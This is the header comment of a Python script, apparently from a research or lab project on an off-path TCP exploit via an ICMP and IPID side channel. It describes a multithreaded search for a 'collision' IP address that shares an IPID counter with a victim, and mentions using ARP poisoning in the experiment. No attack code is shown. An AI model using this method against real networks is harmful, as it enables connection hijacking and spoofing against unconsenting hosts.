    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      collision_find.py (renamed)
    @Brief:         This program is used for finding a collision IP address. This 
                    means target ip address will share its IPID counter with victim 
                    when they interact with Mallory.
                    This program is different form single_check while this program 
                    utilizes multi-thread to check the potential address concurrently.
    @Modify:        2020/2/1    Kevin.F:    Change scapy version 2.4.3
                    2020/2/1    Kevin.F:    Adjust import at line 7

    @Brief:     In real world practice, we need a big address pool for this attack.
                But for simplifying the experiment, we pretend to have a big pool

                We utilized arp-poison attack to fool the server that we own such a
                IP address in the pool.
